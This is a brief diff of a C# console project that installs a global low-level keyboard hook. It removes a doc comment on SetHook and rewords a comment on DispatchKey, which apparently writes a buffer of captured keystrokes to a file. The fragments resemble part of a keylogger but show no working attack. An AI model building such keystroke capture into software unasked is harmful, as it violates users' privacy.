@@ -34,11 +34,6 @@ namespace ConsoleApp1
             NativeMethods.UnhookWindowsHookEx(_hookptr);
         }
 
-        /// <summary>
-        ///     Register the LowLevelKeyboardProc callback function
-        /// </summary>
-        /// <param name="func">The callback function</param>
-        /// <returns> Returns the newly created hook procedure </returns>
         public static IntPtr SetHook(NativeMethods.LowLevelKeyboardProc keyboardCallback)
         {
             using (Process proc = Process.GetCurrentProcess()) {
@@ -71,7 +66,7 @@ namespace ConsoleApp1
         }
 
         /// <summary>
-        ///     Write the buffer to the file and then after that immediately clears that buffer
+        ///     Write the buffer to the key
         /// </summary>
         /// <returns> Doesn't return a value </returns>
         public static void DispatchKey(char key, int vkey, bool isPrintable)
